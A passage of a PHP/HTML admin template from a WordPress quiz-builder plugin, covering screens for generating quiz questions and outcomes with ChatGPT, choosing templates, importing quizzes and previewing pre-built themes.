			<h2 class="chatgpt-section-heading chatgpt-section-heading-1">Generate Quiz Results (Outcome)</h2>
			<p class="chatgpt-section-content chatgpt-section-content-title"><span>You have selected this title:&nbsp;</span><i class="chatgpt-topic"></i></p>
			<div class="chatgpt_form">
				<div class="chatgpt_form_input_wrapper sqb-field-box-style">

					<div class="gpt-field-main-wrapper">
						<label class="control-label">Choose how you'd prefer to generate your quiz outcomes:</label>
						<div class="chatgpt-ai-type-main">
							<label class="chatgpt-ai-type-inner">
								<input type="radio" name="chatgpt_moutcome_choice" value="ai_outcome" checked><span>Use AI to Automatically Generate Outcomes <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc" style="width:450px;text-align:left;">Let AI handle it! SQB will use AI to figure out the right number of outcomes  based on the quiz.</div></div></span>

							</label>
							<label class="chatgpt-ai-type-inner">
								<input type="radio" name="chatgpt_moutcome_choice" value="manualy_outcome"><span>Enter number of Outcomes Manually <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc" style="width:450px;text-align:left;">Simply enter the number of outcomes you'd like. SQB will use AI to generate the outcomes but limit total outcomes to this number.</div></div></span>
							</label>
						</div>
					</div>

					<div class="gpt-field-main-wrapper gpt-outcome-content-part1 gpt-moutcome_limit_wrap" style="display:none">
						<label class="control-label">How many outcome types do you want for this quiz?
						</label>
						<input type="text" name="chatgpt_moutcome_limit" id="chatgpt_moutcome_limit" class="chatgpt-field-input chatgpt-o-normal" placeholder="Enter number here" value="3">
					</div>
					<div class="gpt-field-main-wrapper gpt-outcome-content-part2" style="display:none">
						<label class="control-label">Title:
						</label>
						<input type="text" name="chatgpt_moutcome_title" id="chatgpt_moutcome_title" class="chatgpt-field-input " placeholder="" value="Thank you for completing this survey! 🙏">
						<label class="control-label">Content:
						</label>
						<textarea col="3" row="8" id="chatgpt_moutcome_content" class="chatgpt-field-input">Your feedback is extremely valuable to me. Thank you for taking the time to complete this survey.</textarea>
					</div>
					<div class="button-action">
						<div class="chatgpt-btn-group chatgpt-btn-group-small-wdith">
							<button class="chatgpt-btn chatgpt_mback" data-screen="title" data-back="1">Back</button>
							<button class="chatgpt_generate_quiz_moutcome_prompt chatgpt-btn">Show Prompt</button>
							<button class="chatgpt_generate_quiz_moutcome_submit chatgpt-btn" style="display:none;">Next</button>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-questions-screen chatgpt-screen chatgpt-quiz-common-info" style="display:none" id="chatgpt-quiz-questions-screen" data-screen="questions">
			
			<h2 class="chatgpt-section-heading">You have selected this title:&nbsp;<i class="chatgpt-topic"></i></h2>
			
			<div class="chatgpt_form">
				<p class="chatgpt-section-content sqb-justify-content">Give us some details about questions, answers and outcomes.</p>
				<div class="chatgpt_form_input_wrapper sqb-field-box-style">

					<div class="gpt-field-main-wrapper">
						<label class="control-label">Choose how you'd prefer to generate your quiz questions:</label>
						<div class="chatgpt-ai-type-main">
							<label class="chatgpt-ai-type-inner">
								<input type="radio" name="chatgpt_question_choice" value="ai_question" checked><span>Use AI to Automatically Generate Questions <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc" style="width:450px;text-align:left;">Let AI handle it! SQB will use AI to figure out the right number of questions based on the quiz.</div></div></span>
							</label>
							<label class="chatgpt-ai-type-inner">
								<input type="radio" name="chatgpt_question_choice" value="manualy_question"><span>Enter number of Questions Manually <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc" style="width:450px;text-align:left;">Simply enter the number of outcomes you'd like. SQB will use AI to generate the questions but limit total questions to this number.</div></div></span>
							</label>
						</div>
					</div>

					<div class="gpt-field-main-wrapper chatgpt-q-normal gpt-question_limit_wrap" style="display:none">
						<label class="control-label">How many questions do you want in the quiz? <i>(Max limit: 15)</i></label>
						<div class="gpt-field-wrapper gpt-group-field">
							<div class="gpt-sub-field-wrapper">
								<label>Single Choice</label>
								<input type="text" name="chatgpt_question_single_limit" id="chatgpt_question_single_limit" placeholder="Enter number here" class="chatgpt-field-input" value="3">
							</div>
							<div class="gpt-sub-field-wrapper">
								<label>Multiple Choice</label>
								<input type="text" name="chatgpt_question_multi_limit" id="chatgpt_question_multi_limit" placeholder="Enter number here" class="chatgpt-field-input" value="1">
							</div>
							<div class="gpt-sub-field-wrapper">
								<label>Open ended</label>
								<input type="text" name="chatgpt_question_open_limit" id="chatgpt_question_open_limit" placeholder="Enter number here" class="chatgpt-field-input" value="1">
							</div>
							<div class="gpt-sub-field-wrapper chatgpt_question_ratingscale_wrap">
								<label>Rating Scale</label>
								<input type="text" name="chatgpt_question_ratingscale_limit" id="chatgpt_question_ratingscale_limit" placeholder="Enter number here" class="chatgpt-field-input" value="0">
							</div>
						</div>
					</div>

					<div class="gpt-field-main-wrapper chatgpt-q-normal gpt-question_limit_wrap-ai">
    <label class="control-label">Which type of questions do you want in the quiz?</label>
    <div class="gpt-field-wrapper gpt-group-field gpt-checkbox-group">
        <div class="gpt-sub-field-wrapper">
            <label>
                <input type="checkbox" name="chatgpt_question_single_limit" id="chatgpt_question_single_limitm" value="1" class="" checked>
                Single Choice
            </label>
        </div>
        <div class="gpt-sub-field-wrapper">
            <label>
                <input type="checkbox" name="chatgpt_question_multi_limit" id="chatgpt_question_multi_limitm" value="1" class="" checked>
                Multiple Choice
            </label>
        </div>
        <div class="gpt-sub-field-wrapper">
            <label>
                <input type="checkbox" name="chatgpt_question_open_limit" id="chatgpt_question_open_limitm" value="1" class="" checked>
                Open Ended
            </label>
        </div>
        <div class="gpt-sub-field-wrapper chatgpt_question_ratingscale_wrap">
            <label>
                <input type="checkbox" name="chatgpt_question_ratingscale_limit" id="chatgpt_question_ratingscale_limitm" value="1" class="" checked>
                Rating Scale
            </label>
        </div>
    </div>
</div>


					<div class="gpt-field-main-wrapper chatgpt-q-normal gpt-question_limit_wrap gpt-question-limit-wrrap" style="display:none">
						<input type="hidden" name="chatgpt_q_prompt_type" class="chatgpt_question_prompt_type" value="normal">
						<a href="javascript:void(0);" class="chatgpt_question_prompt chatgpt-shq-prompt chatgpt-q-normal" data-type="prompt">Show Prompt</a>
					</div>
					<div class="gpt-field-main-wrapper chatgpt-q-prompt" style="display:none">
						<textarea col="3" row="8" id="chatgpt_question_prompt" class="chatgpt-field-input chatgpt_question_prompt chatgpt-q-prompt"></textarea>
						<a href="javascript:void(0);" class="chatgpt_question_prompt chatgpt-shq-prompt chatgpt-q-prompt" data-type="normal">Back to Question</a>
					</div>
					<div class="button-action">
						<div class="chatgpt-btn-group">
							<button class="chatgpt-btn chatgpt_back" data-screen="outcome" data-back="1">Back</button>
							<button class="chatgpt_generate_quiz_questions chatgpt-btn" data-noappend="1">Generate</button>
						</div>
					</div>
					<div class="chatgpt_generate_limit_error_message chatgpt_generate_question_error_message">
						<div class="aiq-alert aiq-alert-error">
							<p>Due to OpenAI response limits, you can only generate 7 questions at a time. If you want more than 7 questions, you can generate additional questions by clicking on the "Add More Questions" on the next screen.</p>
						</div>
					</div>
					<?php /*<div class="mt-3 sqb-alert sqb-alert-warning">
						<p>This can take up to a minute or so.</p>
					</div> */ ?>
				</div>
			</div>
			<div class="chatgot-quiz-questions-response-main" style="display:none">
				<p>Select the questions that you want in this quiz. <br />You can click on "add more" to get AI to generate more questions for you.</p>

				<div class="chatgpt_generate_count_error_message" style="display: none;">
					<div class="aiq-alert aiq-alert-error">
						<p>You requested <span class="ai-total-question-count"></span> questions but we only got back <span class="ai-received-question-count"></span> from the OpenAI call. <br>This can happen if the call to OpenAI server times out before OpenAI fully serves the request, or if the data does not come back in the right format.</p>

						<div class="ai-tooltip-wrapper">
							<div class="tool-tip">
								<span>Click here to see how you can resolve this.</span>
								<div class="toll-tip-desc" style="max-width:400px;">
									<p>1. Limit to 5 questions.</p> <span class="br-tag"></span>
									<p>1. Add this to your wp-config.php file:<br>
									ini_set('max_execution_time', 180);</p>

									<p>2. If #1 does not work, set the maximum <br>
									execution time in .htaccess.</p>

									<p>php_value max_execution_time 180</p>

									<p>If it still does not work, please contact <br>
									your webhost's support team for assistance.</p>

								</div>
							</div>
						</div>
					</div>
				</div>

				<div class="chagpt-quiz-questions-response"></div>
				<div class="chatgpt-questions-filter">
				<span for="show_only_selected_question">Show Selected</span>
				<div class="square-switch_onoff">
					<input class="checkbox" name="show_only_selected_question" type="checkbox" id="show_only_selected_question" value="1" >
					<label for="show_only_selected_question"></label>
				</div>
				</div>
				<div class="button-action">
					<div class="chatgpt-btn-group">
						<button class="chatgpt-btn chatgpt_back" data-screen="questions">Back</button>
						<button class="chatgpt_regenerate_question chatgpt-btn chatgpt-btn-regenerate" data-append="1">Add More Questions <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
						<div class="toll-tip-desc" style="width:450px;text-align:left;">You'll not lose the current questions. SQB will use AI to get more relevant questions for you.</div>
					</div></button>
						<button class="chatgpt_to_outcome_screen chatgpt-btn">Next</button>
					</div>
				</div>
			</div>
		</div>
		
		<div class="chatgpt-quiz-outcomeprompt-mscreen chatgpt-screen chatgpt-quiz-common-info" id="chatgpt-quiz-outcomeprompt-mscreen" style="display:none" data-screen="outcomeprompt">
			<h2 class="chatgpt-section-heading">Generate Quiz Results (Outcome)</h2>
			
			<div class="chatgpt_form_input aiq-full-width">
				<div class="chatgpt_prompt_response_wrapper">
					<div class="chatgpt_mprompt_format_wrapper chatgpt_outcome_prompt_code_show">
						<label class="gpt-alert-box">You can use this prompt in ChatGPT. Please copy/paste this in ChatGPT for quiz title ideas.</label>
						<div class="code-container">
						<div class="aiq-copy-btn-wrapper"><span class="copy-icon" data-id="chatgpt_outcomeprompt_format_code" onclick="sqb_copy_to_clipboardNew(this)"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg><i>Copy Code</i></span></div>
						<code id="chatgpt_outcomeprompt_format_code" class="chatgpt_mprompt_format">
						</code>
						</div>
						<div class="aiq-popup-btn-wrapper">
							<button class="chatgpt-btn btn-copy-propmpt" data-id="chatgpt_outcomeprompt_format_code" onclick="sqb_copy_to_clipboardNew(this)"><i>Copy Code</i></button>
						</div>
						<label class="gpt-alert-box gpt-alert-warning">Do NOT remove the sections highlighted in red from the prompt.</label>
					</div>
				</div>
				<div class="button-action">
					<div class="chatgpt-btn-group">
						<button class="chatgpt-btn chatgpt_mback" data-screen="outcome" data-back="1">Back</button>
						<button class="chatgpt_generate_quiz_moutcome chatgpt-btn">Next</button>
					</div>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-outcome-response-mscreen chatgpt-screen chatgpt-quiz-common-info" style="display:none" id="chatgpt-quiz-outcome-response-mscreen" data-screen="outcome">
			
			<div class="chatgpt_form chatgpt-quiz-common-info">
				
				<h2 class="chatgpt-section-heading">Outcome Response</h2>
				<p class="chatgpt-section-content">Enter ChatGPT response in the textarea below:</p>
				<div class="chatgpt_form_input aiq-full-width">
					<div class="chatgpt_form_input_wrapper">
						<textarea name="chatgpt_outcome_json" id="chatgpt_outcome_json" placeholder="Enter the ChatGPT response here (outcomes/results)" class="chatgpt-field-input reset-input"></textarea>
						<div class="chatgpt_generate_moutcome_error chatgpt_generate_error_msg">
							<div class="aiq-alert aiq-alert-error">
							This response is not in the right format.<br /><br />
							Please make sure to copy the prompt from the previous screen and enter it in ChatGPT. Do not remove the text in red.<br /><br />
							Also, whatever response ChatGPT gives you, enter it back here.<br /><br />
							Sometimes ChatGPT does not give back "code" response. When it gives back "plain text" response, please click the "regenerate" button  in ChatGPT or open a new chat and enter SQB's prompt again.<br /><br />
							It should give you back "code" response that looks something like this:<br />
							<img src="<?php echo SQB_URL.'/includes/images/outcome-response.jpg' ?>" style="width:750px;" />
							</div>
						</div>
					</div>
					<div class="button-action">
						<div class="chatgpt-btn-group">
							<button class="chatgpt-btn chatgpt_mback" data-screen="outcomeprompt" data-back="1">Back</button>
							<button class="chatgpt_generate_moutcome chatgpt-btn">Next</button>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-outcomelist-mscreen chatgpt-screen chatgpt-quiz-common-info" id="chatgpt-quiz-outcomelist-mscreen" style="display:none" data-screen="outcomelist">
			<h2 class="chatgpt-section-heading">Here are <span class="outcome-count"></span> possible quiz outcomes:</h2>
			<div class="chatgot-quiz-outcome-mresponse-main chatgpt-quiz-common-info" style="display:none">
				<div class="chagpt-quiz-outcomeprompt-response"></div>
				<div class="button-action">
					<div class="chatgpt-btn-group">
						<button class="chatgpt-btn chatgpt_mback" data-screen="outcome" data-alert="1">Back</button>
						<button class="chatgpt_regenerate_moutcome chatgpt-btn chatgpt-btn-regenerate">Add More Outcomes <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
							<div class="toll-tip-desc" style="width:450px;text-align:left;">You'll not lose the current outcomes. SQB will use AI to get more relevant questions for you.</div>
						</div></button>
						<button class="chatgpt_to_createquiz_mscreen chatgpt-btn">Next</button>
					</div>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-outcome-screen chatgpt-screen chatgpt-quiz-common-info" id="chatgpt-quiz-outcome-screen" style="display:none" data-screen="outcome">
			<h2 class="chatgpt-section-heading chatgpt-section-heading-1">Generate Quiz Results (Outcome)</h2>
			<p class="chatgpt-section-content chatgpt-section-content-title"><span>You have selected this title:&nbsp;</span><i class="chatgpt-topic"></i></p>
			<div class="chatgpt_form">
				<div class="chatgpt_form_input_wrapper sqb-field-box-style">

					<div class="gpt-field-main-wrapper">
						<label class="control-label">Choose how you'd prefer to generate your quiz outcomes:</label>
						<div class="chatgpt-ai-type-main">
							<label class="chatgpt-ai-type-inner">
								<input type="radio" name="chatgpt_outcome_choice" value="ai_outcome" checked><span>Use AI to Automatically Generate Outcomes <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc" style="width:450px;text-align:left;">Let AI handle it! SQB will use AI to figure out the right number of outcomes  based on the quiz.</div></div></span>
							</label>
							<label class="chatgpt-ai-type-inner">
								<input type="radio" name="chatgpt_outcome_choice" value="manualy_outcome"><span>Enter number of Outcomes Manually <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc" style="width:450px;text-align:left;">Simply enter the number of outcomes you'd like. SQB will use AI to generate the outcomes but limit total outcomes to this number.</div></div></span>
							</label>
						</div>
					</div>

					<div class="gpt-field-main-wrapper gpt-noutcome-content-part1 gpt-outcome_limit_wrap" style="display:none">
						<label class="control-label">How many outcome types do you want for this quiz?
						</label>
						<input type="text" name="chatgpt_question_limit" id="chatgpt_outcome_limit" class="chatgpt-field-input chatgpt-o-normal" placeholder="Enter number here" value="3">
						<a href="javascript:void(0);" class="chatgpt_outcome_prompt chatgpt-sho-prompt chatgpt-o-normal" data-type="prompt">Show Prompt</a>
						<textarea col="3" row="8" id="chatgpt_outcome_prompt" class="chatgpt-field-input chatgpt_outcome_prompt chatgpt-o-prompt" style="display:none"></textarea>
						<a href="javascript:void(0);" class="chatgpt_outcome_normal chatgpt-o-prompt chatgpt-sho-prompt" data-type="normal" style="display:none">Reset to default</a>
						<input type="hidden" name="chatgpt_outcome_prompt_type" class="chatgpt_outcome_prompt_type" value="normal">
					</div>
					<div class="gpt-field-main-wrapper gpt-noutcome-content-part2" style="display:none">
						<label class="control-label">Title:
						</label>
						<input type="text" name="chatgpt_outcome_title" id="chatgpt_outcome_title" class="chatgpt-field-input " placeholder="" value="Thank you for completing this survey! 🙏">
						<label class="control-label">Content:
						</label>
						<textarea col="3" row="8" id="chatgpt_outcome_content" class="chatgpt-field-input">Your feedback is extremely valuable to me. Thank you for taking the time to complete this survey.</textarea>
					</div>
					<div class="button-action">
						<div class="chatgpt-btn-group">
							<button class="chatgpt-btn chatgpt_back" data-screen="title" data-back="1">Back</button>
							<button class="chatgpt_generate_quiz_outcome chatgpt-btn">Generate</button>
							<button class="chatgpt_generate_quiz_outcome_submit chatgpt-btn" style="display:none">Next</button>
						</div>
					</div>

					<div class="chatgpt_generate_limit_error_message chatgpt_generate_outcome_error_message">
						<div class="aiq-alert aiq-alert-error">
							<p>Due to OpenAI response limits, you can only generate 10 outcomes at a time. If you want more than 10 outcomes, you can generate additional outcomes by clicking on the "Add More Outcomes" on the next screen.</p>
						</div>
					</div>


				</div>
			</div>
			<div class="chatgot-quiz-outcome-response-main chatgpt-quiz-common-info" style="display:none">
				<h2 class="chatgpt-section-heading">Here are <span class="outcome-count"></span> possible quiz outcomes:</h2>
				<div class="chagpt-quiz-outcome-response"></div>
				<div class="button-action">
					<div class="chatgpt-btn-group">
						<button class="chatgpt-btn chatgpt_back" data-screen="outcome" >Back</button>
						<button class="chatgpt_regenerate_outcome chatgpt-btn chatgpt-btn-regenerate">Add More Outcomes <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
						<div class="toll-tip-desc" style="width:450px;text-align:left;">You'll not lose the current outcomes. SQB will use AI to get more relevant questions for you.</div>
					</div></button>
						<button class="chatgpt_to_createquiz_screen chatgpt-btn">Next</button>
					</div>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-createquiz-screen chatgpt-screen chatgpt-quiz-common-info" id="chatgpt-quiz-createquiz-screen" style="display:none" data-screen="createquiz">
			<h2 class="chatgpt-section-heading">Your quiz is ready to be created.</h2>
			
			<div class="button-action btn-same-line-wrapper">
				<button class="chatgpt_download_pdf chatgpt-btn chatgpt-btn-regenerate" <?php  echo (!defined('SQB_PD_FILE')) ? 'disabled' : ''; ?>>Download PDF</button>
				<span> OR </span>
				<button class="chatgpt_create_quiz chatgpt-btn">Create the quiz</button>
			</div>
			<?php if(!defined('SQB_PD_FILE')){ ?>
			<div class="mt-3 sqb-alert sqb-alert-danger">
				<p>We notice you have not installed/activated SQB PDF Plugin. You can download it from your member's area <a target="_blank" href="https://wickedcoolplugins.com/login">here.</a></p>
				<p>This plugin is required to use the PDF reports feature.</p>
			</div>
			<?php } ?>
		</div>
		<div class="chatgpt-quiz-seltemplate-screen chatgpt-screen chatgpt-quiz-common-info" id="chatgpt-quiz-seltemplate-screen" style="display:none" data-screen="seltemplate">
			<h2 class="chatgpt-section-heading">Select a Template</h2>
			<?php $imgpath = SQB_URL.'/includes/images/'; ?>
			<div class="chatgpt-temlate-selection-wrapper">
				<div class="chatgpt-item-wrapper">
				<div class="chatgpt-temlate-selection-wrapper">
					<div class="chatgpt-item-wrapper">
						<div class="chatgpt-item-inner">
							<div class="chatgpt-item-image"> <img src="<?php echo $imgpath ?>template_img1.jpg"> </div>
							<div class="chatgpt-item-text">
								<h2>Template 1</h2>
								<button class="chatgpt_create_quiz_with_template chatgpt-btn" data-template="template1">Use Template</button>
							</div>
						</div>
						<div class="chatgpt-item-inner">
								<div class="chatgpt-item-image"> <img src="<?php echo $imgpath ?>template_img2.jpg"> </div>
								<div class="chatgpt-item-text">
									<h2>Template 2</h2>
									<button class="chatgpt_create_quiz_with_template chatgpt-btn" data-template="template2">Use Template</button>
								</div>
							</div>
						<div class="chatgpt-item-inner">
								<div class="chatgpt-item-image"> <img src="<?php echo $imgpath ?>template_img3.jpg"> </div>
								<div class="chatgpt-item-text">
									<h2>Template 3</h2>
									<button class="chatgpt_create_quiz_with_template chatgpt-btn" data-template="template3">Use Template</button>
								</div>
							</div>
						<div class="chatgpt-item-inner">
								<div class="chatgpt-item-image"> <img src="<?php echo $imgpath ?>template_img4.jpg"> </div>
								<div class="chatgpt-item-text">
									<h2>Template 4</h2>
									<button class="chatgpt_create_quiz_with_template chatgpt-btn" data-template="template4">Use Template</button>
								</div>
							</div>
						<div class="chatgpt-item-inner">
								<div class="chatgpt-item-image"> <img src="<?php echo $imgpath ?>template8-icon.jpg"> </div>
								<div class="chatgpt-item-text">
									<h2>Template 5</h2>
									<button class="chatgpt_create_quiz_with_template chatgpt-btn" data-template="template8">Use Template</button>
								</div>
							</div>
						<div class="chatgpt-item-inner">
								<div class="chatgpt-item-image"> <img src="<?php echo $imgpath ?>template-5-main.jpg"> </div>
								<div class="chatgpt-item-text">
									<h2>Template 6</h2>
									<button class="chatgpt_create_quiz_with_template chatgpt-btn" data-template="template5">Use Template</button>
								</div>
							</div>
						<div class="chatgpt-item-inner">
								<div class="chatgpt-item-image"> <img src="<?php echo $imgpath ?>template6_img6.png"> </div>
								<div class="chatgpt-item-text">
									<h2>Template 7</h2>
									<button class="chatgpt_create_quiz_with_template chatgpt-btn" data-template="template6">Use Template</button>
								</div>
							</div>
						<div class="chatgpt-item-inner">
								<div class="chatgpt-item-image"> <img src="<?php echo $imgpath ?>template7-icon.jpg" data-template="template7"> </div>
								<div class="chatgpt-item-text">
									<h2>Template 8</h2>
									<button class="chatgpt_create_quiz_with_template chatgpt-btn" data-template="template7">Use Template</button>
								</div>
							</div>
						<div class="chatgpt-item-inner">
								<div class="chatgpt-item-image"> <img src="<?php echo $imgpath ?>template9-icon.png"> </div>
								<div class="chatgpt-item-text">
									<h2>Template 9</h2>
									<button class="chatgpt_create_quiz_with_template chatgpt-btn" data-template="template9">Use Template</button>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-quizcompleted-screen chatgpt-screen chatgpt-quiz-common-info" id="chatgpt-quiz-quizcompleted-screen" style="display:none" data-screen="quizcompleted">
			<h2 class="chatgpt-section-heading">🎉 Congrats 🎉</h2>
			<p class="chatgpt-section-content">Your quiz is ready!</p>
			<div class="chatgpt-section-content chatgpt-shortcode-section">
				<div class="chatgpt-shortcode-label">
					<strong>Shortcode:</strong>
					<div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
						<div class="toll-tip-desc" style="width:450px;text-align:left;">Publish on any WordPress page.</div>
					</div>
				</div>
				<div class="shortcode_display">
					<span class="chatgpt_shortcode" id="dynamic_copyable_text_sqb_dap_quiz"></span>
				</div>
				<span class="copy-btn" data-id="dynamic_copyable_text_sqb_dap_quiz" onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
			</div>
			<div class="chatgpt-section-content chatgpt-iframe-section">
				<div class="chatgpt-shortcode-label">
					<strong>Embedded:</strong>
					<div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
						<div class="toll-tip-desc" style="width:450px;text-align:left;">Don't have WordPress? Use the embedcode.</div>
					</div>
				</div>
				<span class="shortcode_emb_display"><span class="chatgpt_embed" id="dynamic_copyable_text_sqb_cg"><code></code></span> 
				</span>
				<span class="copy-btn"data-id="dynamic_copyable_text_sqb_cg" onclick="sqb_externale_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
			</div>
			
			<div class="chatgpt-section-content chatgpt-edit-section">
				Want to update the quiz?
				<a href="" class="sqb_chatgpt_edit">Click here to EDIT</a>
			</div>
		</div>
	</div>
	<div class="sqb_create_quiz_using_import sqb_import_quiz_tab sqb-template-selection" style="display:none;">
		<span class="sqb-template-selection-close" onclick="sqb_select_built_in_quiz_types_hide()">x</span>
		<h5 class="quiz--sub-title ml-3">Import Quiz</h5>
		<div class="zipFileUpload">
			<form class="form-horizontal" action="#" method="post" name="frmzipImport" id="frmzipImport" enctype="multipart/form-data">
				<div class="input-row">
					<label class="control-label">Upload ZIP File 
						<div class="tool-tip" style="color:#444444;">
						<i class="fa fa-info-circle" aria-hidden="true"></i>
						<div class="toll-tip-desc">You can import the ZIP file that you exported from another SQB site</div>
						</div>
					</label>
					<input type="file" name="zip_file" id="file">
				</div>
				<div class="sqb-quiz-import-actions" style="justify-content: space-around;">
					<a href="javascript:void(0);" class="sqb-quiz-import--btn" onclick="sqb_import_quiz()">Click HERE To Import </a>
				</div>
			</form>
		</div>
	</div>
	
	<div class="sqb_select_quiz_types" style="display:none;">
		<span class="sqb-template-selection-close" onclick="sqb_select_built_in_quiz_types_hide()">x</span>
		<div class="sqb_select_quiz_grid">
		<?php 
		$theme_html  = '';
		$pre_built_template_heading = array('whatcourseshouldyoucreate'=>'Personality Quiz',
			'content-marketing' => 'Content Marketing <div class="tool-tip" style="color: #000;">
				<i class="fa fa-info-circle" aria-hidden="true"></i>
				<div class="toll-tip-desc" style="width:450px;text-align:left;">
					This is a scoring quiz. It\'s inspired by a quiz from Content Marketing Institute. 
				</div>
			</div>',
			'exitintentsurvey' => 'Exit Intent Survey <div class="tool-tip" style="color: #000;">
				<i class="fa fa-info-circle" aria-hidden="true"></i>
				<div class="toll-tip-desc" style="width:450px;text-align:left;">
					This is a personality quiz.
				</div>
			</div>',
			'productfeedbacksurvey'=>'Product Feedback Survey','onlinecourserevenuecalculator'=>'Calculator','areyouaworkaholic'=>'Scoring Quiz <div class="tool-tip" style="color: #000;">
				<i class="fa fa-info-circle" aria-hidden="true"></i>
				<div class="toll-tip-desc" style="width:450px;text-align:left;">
					This is a scoring quiz where each answer is assigned points (negative or positive).</br>
					And based on answer choices, points are added up and at the end, the final outcome is based on scoring range.</br>
					No correct/incorrect answer in this scoring quiz.
				</div>
			</div>','signupbelowforfree'=>'Lead Magnet Quiz <div class="tool-tip" style="color: #000;">
				<i class="fa fa-info-circle" aria-hidden="true"></i><div class="toll-tip-desc" style="width:450px;text-align:left;">Want to increase your opt-in conversions?</br>
					Just replace your static forms with an interactive quiz!</br></br>
					Use this built-in template to quickly create a lead magnet quiz.</br>
					1. When you publish it, it\'ll just be a button.</br>
					2. When users click on it, questions will be displayed in a popup.</br>
					3. At the end, an opt-in form will be displayed.</br>
					4. When users signup, they\'ll be sent to the outcome screen!</br>
					</div></div>');
		
		if( $sqb_pre_built_theme_has){ 
				foreach($alreadyBuiltThemeListOjb as $data_theme){
					
					$quiz_id = $data_theme->getId();
					$quiz_type = $data_theme->getQuizType();
					$pre_built = $data_theme->getPreBuilt();
					$pre_built_details = trim($data_theme->getPreBuiltDetails());
					$pre_built_details = explode('||',$pre_built_details);
					
					$theme_ver = '';
					$theme_name = '';
					
					if(isset($pre_built_details[0])){
						$theme_name =  trim($pre_built_details[0]);
					}
					
					if(isset($pre_built_details[1])){
						$theme_ver = $pre_built_details[1];
					}
					
					
					$theme_start_img = plugins_url('')."/smartquizbuilder/includes/installfromsample/".$quiz_type."/".$theme_name."/images/start.png";
					$theme_outcome_img = plugins_url('')."/smartquizbuilder/includes/installfromsample/".$quiz_type."/".$theme_name."/images/outcome.jpg";
					$theme_optin_img = plugins_url('')."/smartquizbuilder/includes/installfromsample/".$quiz_type."/".$theme_name."/images/optin.jpg";
					
					$preview_html  = '';
					if($quiz_type == 'survey'){
					$theme_start_img2 = plugins_url('')."/smartquizbuilder/includes/installfromsample/".$quiz_type."/".$theme_name."/images/start2.png";
					$preview_html  .= '<div class="temp-pre-img-outer"><div class="heading_pre_popup">Start Screen</div><img src="'.$theme_start_img2.'" alt="img"></div>';
					} else if($theme_name == 'exitintentsurvey'){
					$theme_start_img2 = plugins_url('')."/smartquizbuilder/includes/installfromsample/".$quiz_type."/".$theme_name."/images/start2.png";
					$preview_html  .= '<div class="temp-pre-img-outer"><div class="heading_pre_popup">Start Screen</div><img src="'.$theme_start_img2.'" alt="img"></div>';
					} else {
					$preview_html  .= '<div class="temp-pre-img-outer"><div class="heading_pre_popup">Start Screen</div><img src="'.$theme_start_img.'" alt="img"></div>';
					}
					
					$questionsdata = SQB_QuizQuestions::loadByQuizId($quiz_id);
					$quest_img_no = 0;
					$sqb_quest_slider_html = '';
					foreach($questionsdata as $questiondata){
						$quest_img_no++;
						$quest_img = plugins_url('')."/smartquizbuilder/includes/installfromsample/".$quiz_type."/".$theme_name."/images/quest".$quest_img_no.".jpg";
						$slider_active_class = '';
						if($quest_img_no == 1){
							$slider_active_class =  ' active ';
						}
						$sqb_quest_slider_html .= '<div class="carousel-item '.$slider_active_class.'"><img class="d-block w-100" src="'.$quest_img.'" alt="First slide"></div>';
						
					}
					$sqb_quest_slider_html = '<div data-id="sqb_quest_carouselExampleControls_'.$quiz_id.'" class="carousel_question carousel_question_screen sqb_slide slider" data-ride="carousel1"> <a class="left carousel-control" href="javascript:void(0)" data-slide="prev" onclick="jQuery(\'#sqb_quest_carouselExampleControls_'.$quiz_id.'\').carousel(\'prev\')">‹</a>
												<a class="right carousel-control" href="javascript:void(0)" data-slide="next" onclick="jQuery(\'#sqb_quest_carouselExampleControls_'.$quiz_id.'\').carousel(\'next\')">›</a>
												
												<div class="carousel-inner">'.$sqb_quest_slider_html.'
												</div>
												
												 
												  
												</div>
												';
					$preview_html  .= '<div class="temp-pre-img-outer"><div class="heading_pre_popup">Questions Screen</div><h5 style="font-size: 16px;margin: 0 0 16px 0;color: #737373;">Click on the slider / arrow to see all questions</h5> '.$sqb_quest_slider_html.'</div>';
					
					$preview_html  .= '<div class="temp-pre-img-outer"><div class="heading_pre_popup">Opt-In Screen</div><img src="'.$theme_optin_img.'" alt="img"></div>';
					
					
					
					
					$sqb_outcome_slider_html = '';
					for($outcome_img_counter = 1; $outcome_img_counter <= 4 ; $outcome_img_counter++){
						
						$outcome_img = plugins_url('')."/smartquizbuilder/includes/installfromsample/".$quiz_type."/".$theme_name."/images/outcome".$outcome_img_counter.".jpg";
						$slider_active_class = '';
